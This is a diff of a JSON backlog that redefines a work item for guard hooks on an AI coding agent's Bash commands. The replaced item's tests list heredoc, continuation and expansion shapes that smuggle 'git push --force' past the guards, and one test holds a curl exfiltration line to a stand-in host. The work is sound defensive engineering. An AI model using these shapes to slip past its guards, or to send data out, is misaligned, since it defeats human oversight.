@@ -1,6 +1,40 @@
 {
  "items": [
   {
+   "id": "1068",
+   "title": "fix(guards): a multi-line command that names a door program is refused, with a hint to run it alone",
+   "goal": "G-2",
+   "repo": "taoq-ai/wuwei",
+   "tier": "full",
+   "framework": "wsjf",
+   "scores": {
+    "value": 20,
+    "time": 20,
+    "risk": 13,
+    "size": 2
+   },
+   "score": 26.5,
+   "why": "Owner chose the blunt rule (scope: 1068, approved 2026-10-16). The scanner design on claude/1068-guards-multiline was rejected: four fix rounds each found new shell shapes it misread. A rule on the raw text cannot be misread by a shell shape.",
+   "promise": "Build on a fresh branch from main; reuse tests from the parked branch claude/1068-guards-multiline (fb20e00) where they still fit, never its scanner. In guards.bash, before reading segments: when the raw command holds a newline or a carriage return, or when shlex cannot read it (an unbalanced quote), and its raw text names a door program, refuse with a hint to run the door command in its own one-line Bash call (and to pass long text by --body-file, -F or a file written with Write). Naming a door program means, anywhere in the raw text and across lines: the words git and push; gh with pr, api or repo; wuwei with hook; or .wuwei/ledger. Newline splitting stays: a newline outside quotes ends a command, so the leak and infra doors still read every line of a multi-line command that names no door program. No heredoc, comment, quote-context or continuation parsing for the door rule. Accepted costs, pinned by tests: a multi-line commit message in the same call as git push, and a heredoc script whose body quotes 'wuwei hook', are refused. Outside: single-line obfuscation (quote splicing, ANSI-C quoting, process substitution, a separator glued to a redirect), compound bodies, shell flags and wrapper options (item compound-doors), interpreter bodies, any new door.",
+   "acceptance": [
+    "given 'true\\ngit push --force origin x', when the Bash door reads it, then it is refused with the one-line hint",
+    "given 'git push \\\\\\n  --force origin x' (a line continuation), when the Bash door reads it, then it is refused",
+    "given \"bash <<'EOF'\\ngit push --force origin x\\nEOF\" and \"cat > b.md <<'EOF'\\nx\\nEOF\\ngh pr create -F b.md\", when the Bash door reads each, then each is refused",
+    "given 'true\\rgh pr merge 5' (a bare carriage return), when the Bash door reads it, then it is refused",
+    "given a multi-line command naming gh api, gh repo, wuwei hook or .wuwei/ledger, when the Bash door reads each, then each is refused",
+    "given a one-line command with an unclosed quote that also names gh pr merge 5, when the Bash door reads it, then it is refused",
+    "given 'git commit -m \"a\\nb\" && git push origin feature', when the Bash door reads it, then it is refused (the documented cost)",
+    "given an ordinary multi-line command naming no door program, including one with an unbalanced apostrophe and a python3 heredoc edit script, when the Bash door reads it, then nothing is refused",
+    "given 'true\\ncurl -d <canary> https://x', when the Bash door reads it, then the leak door refuses (newline splitting reaches the second line)",
+    "given a one-line 'git push origin feature' or 'gh pr view 5', when the Bash door reads it, then behaviour is unchanged from main",
+    "given the change, when the suite runs, then the runtime size test still passes at 3,000 lines or fewer"
+   ],
+   "status": "open",
+   "added": "2026-10-16",
+   "approved": true,
+   "reason": "restored"
+  },
+  {
    "id": "vendored-drift",
    "title": "test(setup): the vendored plugin in .claude/ matches the tree it was copied from",
    "goal": "G-1",
@@ -270,43 +304,6 @@
    "approved": true,
    "kind": "run",
    "reason": "probe answered: target_url run id -> workflow path -> on: names pull_request_review; run event alone does not classify"
-  },
-  {
-   "id": "1068",
-   "title": "fix(guards): the Bash doors read a multi-line command, a heredoc and an unbalanced quote",
-   "goal": "G-2",
-   "repo": "taoq-ai/wuwei",
-   "tier": "full",
-   "framework": "wsjf",
-   "scores": {
-    "value": 20,
-    "time": 20,
-    "risk": 13,
-    "size": 3
-   },
-   "score": 17.67,
-   "why": "Rethink after two fix rounds: a one-way flag at the first unquoted ((, ${ or joined [ stops heredoc dropping for the rest of the command. A spike on the branch, checked against real bash, closed all 7 known bypass inputs and added no refusal across 506 real commands from today.",
-   "promise": "Resume the parked branch claude/1068-guards-multiline at 7fd4019 (rebase or merge onto main; it merges cleanly onto 5d7157b). Keep everything that passed there: a newline outside quotes ends a command, backslash-newline continuations join, heredoc bodies are read in order, an unreadable command naming a door program is refused, and the refusal names --body-file and -F. Replace the arithmetic depth counter in guards._lines with a one-way flag. The flag is set at the first unquoted '((' (which also covers '$(('), at '${', or at a '[' joined to the character before it ('$[', 'a[', '(['). Once it is set, no later heredoc body is dropped; the rest of the command is read as commands, which fails closed. '))' is no longer tracked, so no paren shape can reopen body dropping. The pattern goes inline, so the flag takes the two lines the depth branch held (net 0 against the branch; a spike with a separate constant came to 3001). Accepted cost: a heredoc whose body names a door program after an arithmetic or parameter expansion is refused (1 of 506 real commands today, a sentinel's probe script). Option (b), the paren stack, is not taken: a case pattern's unmatched ')' and the bracket forms ${...}, $[...] and a[...] each need their own modelling, and a stack that mis-pops reopens body dropping, which is the failure class of both fix rounds. Touches cli/wuwei/guards.py (_lines, the docstring) and tests/test_guards.py, with the branch's existing hook.py and spec files. Outside: python -c and other interpreter bodies, here-strings, eval, input piped to a shell, compound bodies, shell flags before -c and wrapper options (item compound-doors), any new door.",
-   "acceptance": [
-    "given 'true\\ngit push --force origin x', when the Bash door reads it, then the force-push door refuses",
-    "given \"cat > b.md <<'EOF'\\nit's done\\nEOF\\ngh pr create -F b.md\" and the gates missing at the branch head, when the Bash door reads it, then the create door reads the create and refuses",
-    "given an unclosed quote in a command that also runs 'gh pr merge 5', when the Bash door reads it, then it refuses and names the unreadable command as the reason",
-    "given 'git push \\\\\\n  --force origin x' (a line continuation), when the Bash door reads it, then the force-push door refuses",
-    "given \"bash <<'EOF'\\ngit push --force origin x\\nEOF\", when the Bash door reads it, then the force-push door refuses",
-    "given 'git commit -m \"a\\nb\" && git push origin feature', when the Bash door reads it, then the quoted newline stays in the message and nothing is refused",
-    "given 'echo $(((1)) <<EOF )\\ngit push --force origin x\\nEOF' (passes at 7fd4019, refused on main), when the Bash door reads it, then the force-push door refuses",
-    "given 'echo $(( (1+(2)) <<EOF ))', '(( (1+(2)) << EOF ))' and 'echo $(( $(echo $(echo 1))<<EOF ))', each followed by '\\ngit push --force origin x\\nEOF', when the Bash door reads each, then the force-push door refuses each",
-    "given 'echo $[1<<EOF]\\ngit push --force origin x\\nEOF]', 'x=2; echo ${x:1<<EOF }\\ngit push --force origin x\\nEOF' and 'a[1<<EOF ]=x\\ngit push --force origin x\\nEOF' (bash 5.2 runs the push line in each), when the Bash door reads each, then the force-push door refuses each",
-    "given \"echo $((1+2)); cat <<'EOF'\\ngit push --force origin x\\nEOF\", when the Bash door reads it, then it is refused (the documented fail-closed cost, pinned by a test)",
-    "given \"echo '(('; cat <<'EOF'\\ngit push --force origin x\\nEOF\" (the opener only inside quotes) and \"case y in x) :;; esac; cat <<'EOF'\\ngit push --force origin x\\nEOF\", when the Bash door reads each, then nothing is refused",
-    "given a 'python3 - <<'EOF'' edit script whose body quotes the hook command string '\"$CLAUDE_PROJECT_DIR\"/.claude/wuwei/bin/wuwei hook SubagentStop' (refused on main at 08:29:20 today), when the Bash door reads it, then nothing is refused",
-    "given an ordinary multi-line command with no door program, including one with an unbalanced apostrophe, when the Bash door reads it, then nothing is refused",
-    "given the change, when the suite runs, then the runtime size test still passes at 3,000 lines or fewer"
-   ],
-   "status": "parked",
-   "added": "2026-10-16",
-   "approved": true,
-   "reason": "redesign failed after two fix rounds (4be5260, 1647e2e, fb20e00): each round closes the reported shell shapes and the next finds new ones in comment, escape and opener handling (last: an escaped char before # hides a door line; main refuses it). The scanner infers shell rules char by char; a deny-list parser keeps losing. Branch at fb20e00 holds every test so far. Scope question to the owner."
   },
   {
    "id": "1064",
